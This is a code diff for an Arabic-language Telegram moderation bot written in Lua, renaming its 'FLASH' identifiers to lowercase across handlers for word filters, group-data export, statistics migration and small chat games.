-if FLASHdx1:get(FLASH.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if flashdx1:get(flash.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
 function get_warning(extra,result,success)
 local id = msg.id_
 local msgs = { [0] = id} 
@@ -3085,34 +3085,34 @@ delete_msg(chat, msgs)
 text = '❅∫ عذرا عزيزي  [firstname](https://telegram.me/username) \n❅∫ ممنوع الفشار هنا التزم فضلا .'
 local text = text:gsub('firstname',(result.first_name_ or ''))
 local text = text:gsub('username',(result.username_ or 'FAQY4'))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end 
 getUser(msg.sender_user_id_,get_warning)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if flashdx1:get(flash.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = { [0] = id}
 local chat = msg.chat_id_
-if FLASHdx1:get(FLASH..'far'..msg.chat_id_) == 'thhhh' then
+if flashdx1:get(flash..'far'..msg.chat_id_) == 'thhhh' then
 delete_msg(chat, msgs)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ممنوع التكلم باللغه الفارسيه هنا  ', 1, 'md')   
-elseif FLASHdx1:get(FLASH..'far'..msg.chat_id_) == 'bedthhh' then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ممنوع التكلم باللغه الفارسيه هنا  ', 1, 'md')   
+elseif flashdx1:get(flash..'far'..msg.chat_id_) == 'bedthhh' then
 delete_msg(chat, msgs)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if flashdx1:get(flash.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = { [0] = id}
 local chat = msg.chat_id_
 delete_msg(chat, msgs)
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
-if FLASHdx1:get(FLASH.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if flashdx1:get(flash.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
 function get_warning(extra,result,success)
 local id = msg.id_
 local msgs = { [0] = id}
@@ -3121,13 +3121,13 @@ delete_msg(chat, msgs)
 text = '❅∫ عذرا عزيزي  [firstname](https://telegram.me/username) \n❅∫ ممنوع التكلم بالطائفيه هنا .'
 local text = text:gsub('firstname',(result.first_name_ or ''))
 local text = text:gsub('username',(result.username_ or 'FAQY4'))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end 
 getUser(msg.sender_user_id_,get_warning)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
-if FLASHdx1:get(FLASH.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
+if flashdx1:get(flash.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
 function get_warning(extra,result,success)
 local id = msg.id_
 local msgs = { [0] = id}
@@ -3136,26 +3136,26 @@ delete_msg(chat, msgs)
 text = '❅∫ عذرا عزيزي  [firstname](https://telegram.me/username) \n❅∫ ممنوع الكفران هنا التزم فضلا .'
 local text = text:gsub('firstname',(result.first_name_ or ''))
 local text = text:gsub('username',(result.username_ or 'FAQY4'))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end 
 getUser(msg.sender_user_id_,get_warning)
 end end
----------------------------- End Functions FLASH ----------------------------
-----------------******* Started Code Source FLASH *******---------
+---------------------------- End Functions flash ----------------------------
+----------------******* Started Code Source flash *******---------
 if text == 'جلب نسخه الجروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
-local list = FLASHdx1:smembers(FLASH..'bot:groups')  
-local t = '{"BOT_ID": '..FLASH..',"GP_BOT":{'  
+local list = flashdx1:smembers(flash..'bot:groups')  
+local t = '{"BOT_ID": '..flash..',"GP_BOT":{'  
 for k,v in pairs(list) do   
 NAME = title_name(v) or ''
 NAME = NAME:gsub('"','')
 NAME = NAME:gsub('#','')
 NAME = NAME:gsub([[\]],'')
-link = FLASHdx1:get(FLASH.."bot:group:link"..v) or ''
-welcome = FLASHdx1:get(FLASH..'welcome:'..v) or ''
-MNSH = FLASHdx1:smembers(FLASH..'bot:monsh:'..v)
-MDER = FLASHdx1:smembers(FLASH..'bot:owners:'..v)
-MOD = FLASHdx1:smembers(FLASH..'bot:momod:'..v)
-VIP = FLASHdx1:smembers(FLASH..'bot:vipmem:'..v)
+link = flashdx1:get(flash.."bot:group:link"..v) or ''
+welcome = flashdx1:get(flash..'welcome:'..v) or ''
+MNSH = flashdx1:smembers(flash..'bot:monsh:'..v)
+MDER = flashdx1:smembers(flash..'bot:owners:'..v)
+MOD = flashdx1:smembers(flash..'bot:momod:'..v)
+VIP = flashdx1:smembers(flash..'bot:vipmem:'..v)
 if k == 1 then
 t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
 else
@@ -3207,9 +3207,9 @@ t = t..'}}'
 local File = io.open('./'..bot_id..'.json', "w")
 File:write(t)
 File:close()
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..FLASH..'.json', '❅∫ عدد جروبات البوت : '..#list..'',dl_cb, nil)
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..flash..'.json', '❅∫ عدد جروبات البوت : '..#list..'',dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
@@ -3220,218 +3220,218 @@ add_file(msg,msg.chat_id_,ID_FILE,File_Name)
 end end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'نقل احصائيات تشاكي' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
-local Users = FLASHdx1:smembers(FLASH.."Tshake:UsersBot")
-local Groups = FLASHdx1:smembers(FLASH..'Tshake:Chek:Groups') 
+local Users = flashdx1:smembers(flash.."Tshake:UsersBot")
+local Groups = flashdx1:smembers(flash..'Tshake:Chek:Groups') 
 for i = 1, #Groups do
-FLASHdx1:sadd(FLASH..'bot:groups',Groups[i])  
-FLASHdx1:sadd("FLASH:addg"..bot_id,Groups[i])  
-FLASHdx1:set(FLASH.."bot:enable:"..Groups[i],true)
-FLASHdx1:setex(FLASH.."bot:charge:"..Groups[i],86400,true)
-local list1 = FLASHdx1:smembers(FLASH..'Tshake:Basic:Constructor'..Groups[i])
+flashdx1:sadd(flash..'bot:groups',Groups[i])  
+flashdx1:sadd("flash:addg"..bot_id,Groups[i])  
+flashdx1:set(flash.."bot:enable:"..Groups[i],true)
+flashdx1:setex(flash.."bot:charge:"..Groups[i],86400,true)
+local list1 = flashdx1:smembers(flash..'Tshake:Basic:Constructor'..Groups[i])
 print(#list1)
 for k,v in pairs(list1) do
-FLASHdx1:sadd(FLASH.."bot:monsh:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:monsh:"..Groups[i], v)
 end
-local list2 = FLASHdx1:smembers(FLASH..'Tshake:Constructor'..Groups[i])
+local list2 = flashdx1:smembers(flash..'Tshake:Constructor'..Groups[i])
 print(#list2)
 for k,v in pairs(list2) do
-FLASHdx1:sadd(FLASH.."bot:monsh2:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:monsh2:"..Groups[i], v)
 end
-local list3 = FLASHdx1:smembers(FLASH..'Tshake:Manager'..Groups[i])
+local list3 = flashdx1:smembers(flash..'Tshake:Manager'..Groups[i])
 print(#list3)
 for k,v in pairs(list3) do
-FLASHdx1:sadd(FLASH.."bot:owners:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:owners:"..Groups[i], v)
 end
-local list4 = FLASHdx1:smembers(FLASH..'Tshake:Mod:User'..Groups[i])
+local list4 = flashdx1:smembers(flash..'Tshake:Mod:User'..Groups[i])
 print(#list4)
 for k,v in pairs(list4) do
-FLASHdx1:sadd(FLASH.."bot:momod:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:momod:"..Groups[i], v)
 end
 end
 for i = 1, #Users do
-FLASHdx1:sadd(FLASH..'bot:userss',Users[i])  
+flashdx1:sadd(flash..'bot:userss',Users[i])  
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ تم نقل : '..#Groups..' جروب ،\n❅∫ تم نقل : '..#Users..' مشترك ،\n❅∫ تم نقل المنشئين الاساسيين والثانويين ،\n❅∫ تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ التنصيب السابق للبوت { سورس تشاكي } ،', "md")
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ تم نقل : '..#Groups..' جروب ،\n❅∫ تم نقل : '..#Users..' مشترك ،\n❅∫ تم نقل المنشئين الاساسيين والثانويين ،\n❅∫ تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ التنصيب السابق للبوت { سورس تشاكي } ،', "md")
 end
 if text == 'نقل احصائيات الزعيم' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
-local Users = FLASHdx1:smembers(FLASH..'users')
-local Groups = FLASHdx1:smembers(FLASH..'group:ids') 
+local Users = flashdx1:smembers(flash..'users')
+local Groups = flashdx1:smembers(flash..'group:ids') 
 for i = 1, #Groups do
-FLASHdx1:sadd(FLASH..'bot:groups',Groups[i])  
-FLASHdx1:sadd("FLASH:addg"..bot_id,Groups[i])  
-FLASHdx1:set(FLASH.."bot:enable:"..Groups[i],true)
-FLASHdx1:setex(FLASH.."bot:charge:"..Groups[i],86400,true)
-local list1 = FLASHdx1:smembers(FLASH..':MONSHA_Group:'..Groups[i])
+flashdx1:sadd(flash..'bot:groups',Groups[i])  
+flashdx1:sadd("flash:addg"..bot_id,Groups[i])  
+flashdx1:set(flash.."bot:enable:"..Groups[i],true)
+flashdx1:setex(flash.."bot:charge:"..Groups[i],86400,true)
+local list1 = flashdx1:smembers(flash..':MONSHA_Group:'..Groups[i])
 print(#list1)
 for k,v in pairs(list1) do
-FLASHdx1:sadd(FLASH.."bot:monsh:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:monsh:"..Groups[i], v)
 end
-local list2 = FLASHdx1:smembers(FLASH..':MONSHA_BOT:'..Groups[i])
+local list2 = flashdx1:smembers(flash..':MONSHA_BOT:'..Groups[i])
 print(#list2)
 for k,v in pairs(list2) do
-FLASHdx1:sadd(FLASH.."bot:monsh2:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:monsh2:"..Groups[i], v)
 end
-local list3 = FLASHdx1:smembers(FLASH..'owners:'..Groups[i])
+local list3 = flashdx1:smembers(flash..'owners:'..Groups[i])
 print(#list3)
 for k,v in pairs(list3) do
-FLASHdx1:sadd(FLASH.."bot:owners:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:owners:"..Groups[i], v)
 end
-local list4 = FLASHdx1:smembers(FLASH..'owners:'..Groups[i])
+local list4 = flashdx1:smembers(flash..'owners:'..Groups[i])
 print(#list4)
 for k,v in pairs(list4) do
-FLASHdx1:sadd(FLASH.."bot:momod:"..Groups[i], v)
+flashdx1:sadd(flash.."bot:momod:"..Groups[i], v)
 end
 end
 for i = 1, #Users do
-FLASHdx1:sadd(FLASH..'bot:userss',Users[i])  
+flashdx1:sadd(flash..'bot:userss',Users[i])  
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ تم نقل : '..#Groups..' جروب ،\n❅∫ تم نقل : '..#Users..' مشترك ،\n❅∫ تم نقل المنشئين الاساسيين والثانويين ،\n❅∫ تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ التنصيب السابق للبوت { سورس الزعيم } ،', "md")
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ تم نقل : '..#Groups..' جروب ،\n❅∫ تم نقل : '..#Users..' مشترك ،\n❅∫ تم نقل المنشئين الاساسيين والثانويين ،\n❅∫ تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ التنصيب السابق للبوت { سورس الزعيم } ،', "md")
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("منو ضافني") or text:match("منو ضافني هنا") then
-if not FLASHdx1:get(FLASH..'Added:Me'..msg.chat_id_) then
+if not flashdx1:get(flash..'Added:Me'..msg.chat_id_) then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
 if da and da.status_.ID == "ChatMemberStatusCreator" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ انت منشئ المجموعه .', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ انت منشئ المجموعه .', 1, 'md')
 return false
 end
-local Added_Me = FLASHdx1:get(FLASH.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
+local Added_Me = flashdx1:get(flash.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
 if Added_Me then 
 tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
 local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
 Text = '*❅∫ الشخص الذي ضافك هو* ⌯» '..Name
 sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
 end,nil) else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ انت دخلت عبر الرابط .', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ انت دخلت عبر الرابط .', 1, 'md')
 end end,nil) else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل من قبل المدراء .', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل من قبل المدراء .', 1, 'md')
 end end 
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
+--     By Developer flash     -- 
+if flashdx1:get(flash.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 6 then
-FLASHdx( msg.chat_id_, msg.id_, 1,"*❅∫ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخرى .*\n", 1, "md")
+flashdx( msg.chat_id_, msg.id_, 1,"*❅∫ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخرى .*\n", 1, "md")
 return false  end 
-local GETNUM = FLASHdx1:get(FLASH.."GAMES"..msg.chat_id_)
+local GETNUM = flashdx1:get(flash.."GAMES"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-FLASHdx1:del(FLASH.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
-FLASHdx( msg.chat_id_, msg.id_, 1,'\n*❅∫ مبروك لقد ربحت  \n❅∫ المحيبس باليد رقم { '..NUM..' } \n❅∫ حصلت على {  5 } نقاط يمكن استبدالها برسائل ،*', 1, "md")
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
+flashdx1:del(flash.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+flashdx( msg.chat_id_, msg.id_, 1,'\n*❅∫ مبروك لقد ربحت  \n❅∫ المحيبس باليد رقم { '..NUM..' } \n❅∫ حصلت على {  5 } نقاط يمكن استبدالها برسائل ،*', 1, "md")
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-FLASHdx1:del(FLASH.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
-FLASHdx( msg.chat_id_, msg.id_, 1,'\n*❅∫ للاسف لقد خسرت  \n❅∫ المحيبس باليد رقم { '..GETNUM..' } \n❅∫ حاول مره اخرى للعثور على المحيبس  *', 1, "md")
+flashdx1:del(flash.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+flashdx( msg.chat_id_, msg.id_, 1,'\n*❅∫ للاسف لقد خسرت  \n❅∫ المحيبس باليد رقم { '..GETNUM..' } \n❅∫ حاول مره اخرى للعثور على المحيبس  *', 1, "md")
 end end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH.."bot:support:link" .. msg.sender_user_id_) then
+--     By Developer flash     -- 
+if flashdx1:get(flash.."bot:support:link" .. msg.sender_user_id_) then
 if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
 local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
 local hash = "bot:supports:link"
-FLASHdx1:set(FLASH..hash, glink)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ رابط جروب الدعم ، ", 1, "md")
-FLASHdx1:del(FLASH.."bot:support:link" .. msg.sender_user_id_)
+flashdx1:set(flash..hash, glink)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ رابط جروب الدعم ، ", 1, "md")
+flashdx1:del(flash.."bot:support:link" .. msg.sender_user_id_)
 elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
 local bID = msg.content_.text_:match("@(.*)")
 local hash = "bot:supports:link"
-FLASHdx1:set(FLASH..hash, bID)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ معرف الدعم ، ", 1, "md")
-FLASHdx1:del(FLASH.."bot:support:link" .. msg.sender_user_id_)
+flashdx1:set(flash..hash, bID)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ معرف الدعم ، ", 1, "md")
+flashdx1:del(flash.."bot:support:link" .. msg.sender_user_id_)
 end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH..'FLASH4'..msg.sender_user_id_) then
-FLASHdx1:del(FLASH..'FLASH4'..msg.sender_user_id_)
+--     By Developer flash     -- 
+if flashdx1:get(flash..'flash4'..msg.sender_user_id_) then
+flashdx1:del(flash..'flash4'..msg.sender_user_id_)
 local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
 local data = json:decode(url)
 if res == 400 then
 if data.description == "Bad Request: supergroup members are unavailable" then 
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ لم ترفعني ادمن في قناتك ارفعني اولا ، *\n", 1 , "md")
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ لم ترفعني ادمن في قناتك ارفعني اولا ، *\n", 1 , "md")
 return false 
 elseif data.description == "Bad Request: chat not found" then 
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
 return false
 end end 
 if not msg.content_.text_ then
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
 return false
 end
 local CH_BOT = msg.content_.text_:match("(.*)")
-FLASHdx1:set(FLASH..'FLASH3',CH_BOT)
-FLASHdx(msg.chat_id_,msg.id_, 1, "❅∫ تم حفظ القناة ، \n❅∫ قم بتفعيل الاشتراك الاجباري الان ، \n", 1 , "html")
+flashdx1:set(flash..'flash3',CH_BOT)
+flashdx(msg.chat_id_,msg.id_, 1, "❅∫ تم حفظ القناة ، \n❅∫ قم بتفعيل الاشتراك الاجباري الان ، \n", 1 , "html")
 return false
 end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
-FLASHdx1:del(FLASH.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
+--     By Developer flash     -- 
+if flashdx1:get(flash.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
+flashdx1:del(flash.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
 local nerkh = msg.content_.text_:match("(.*)")
-FLASHdx1:set(FLASH.."nerkh", nerkh)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ كليشه المطور ،", 1, "md")
+flashdx1:set(flash.."nerkh", nerkh)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ كليشه المطور ،", 1, "md")
 end
- --     By Developer FLASH     -- 
+ --     By Developer flash     -- 
 if text and text:match("^(.*)$") then
-local FLASH = FLASHdx1:get('FLASH:'..bot_id..'namebot'..msg.sender_user_id_..'')
-if FLASH == 'msg' then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ اسم البوت الجديد ،", 1, "md")
-FLASHdx1:set('FLASH:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
-FLASHdx1:set('FLASH:'..bot_id..'name_bot', text)
+local flash = flashdx1:get('flash:'..bot_id..'namebot'..msg.sender_user_id_..'')
+if flash == 'msg' then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ اسم البوت الجديد ،", 1, "md")
+flashdx1:set('flash:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
+flashdx1:set('flash:'..bot_id..'name_bot', text)
 return false 
 end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
+--     By Developer flash     -- 
+if flashdx1:get(flash..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
 print("Return False [Lock] [Cmd]")
 else  
---     By Developer FLASH     -- 
- if text:match("^الرابط$") and FLASH11(msg) then
-if not FLASHdx1:get(FLASH.."bot:tt:link:"..msg.chat_id_) then 
-local link = FLASHdx1:get(FLASH.."bot:group:link"..msg.chat_id_)
+--     By Developer flash     -- 
+ if text:match("^الرابط$") and flash11(msg) then
+if not flashdx1:get(flash.."bot:tt:link:"..msg.chat_id_) then 
+local link = flashdx1:get(flash.."bot:group:link"..msg.chat_id_)
 if link then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *رابط المجموعة* .\n\n" .. link, 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *رابط المجموعة* .\n\n" .. link, 1, "md")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥 ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥 ،', 1, 'md')
 end else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الرابط معطل لا يمكن ارساله ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الرابط معطل لا يمكن ارساله ،', 1, 'md')
 end end
 if text and text:match("^القوانين$") or text and text:match("^قوانين$") then
-local rules = FLASHdx1:get(FLASH..'bot:rules'..msg.chat_id_)
+local rules = flashdx1:get(flash..'bot:rules'..msg.chat_id_)
 if rules then
-FLASHdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
+flashdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم وضع قوانين ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم وضع قوانين ، ', 1, 'md')
 end end
---     By Developer FLASH     --
-if text == "نسبه الحب" and FLASH11(msg) then
-FLASHdx1:set(FLASH..'nsba'..msg.chat_id_..msg.sender_user_id_,'Check')
-FLASH = '❅∫ ارسل اسمك واسم الشخص الاخر ،\n❅∫ مثال :- فلاش وفلاشه ، '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+--     By Developer flash     --
+if text == "نسبه الحب" and flash11(msg) then
+flashdx1:set(flash..'nsba'..msg.chat_id_..msg.sender_user_id_,'Check')
+flash = '❅∫ ارسل اسمك واسم الشخص الاخر ،\n❅∫ مثال :- فلاش وفلاشه ، '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text and text ~="نسبه الحب"  and FLASHdx1:get(FLASH..'nsba'..msg.chat_id_..msg.sender_user_id_) == 'Check' then
+if text and text ~="نسبه الحب"  and flashdx1:get(flash..'nsba'..msg.chat_id_..msg.sender_user_id_) == 'Check' then
 tt = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","3","8","3","6","0",};
 rr = tt[math.random(#tt)]
-FLASH2 = '❅∫ نسبه حب ، '..text..' هي : '..rr..'%'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH2, 1, 'md')
-FLASHdx1:del(FLASH..'nsba'..msg.chat_id_..msg.sender_user_id_)
+flash2 = '❅∫ نسبه حب ، '..text..' هي : '..rr..'%'
+flashdx(msg.chat_id_, msg.id_, 1,flash2, 1, 'md')
+flashdx1:del(flash..'nsba'..msg.chat_id_..msg.sender_user_id_)
 end
---     By Developer FLASH     --
-if text and text:match("^احسب (.*)$") and FLASH11(msg) or text and text:match("^عمري (.*)$") and FLASH11(msg) then 
+--     By Developer flash     --
+if text and text:match("^احسب (.*)$") and flash11(msg) or text and text:match("^عمري (.*)$") and flash11(msg) then 
 local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
 UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
 Age = JSON.decode(UrlAge)
 t = Age.ok.abs
-FLASHdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
---     By Developer FLASH     -- 
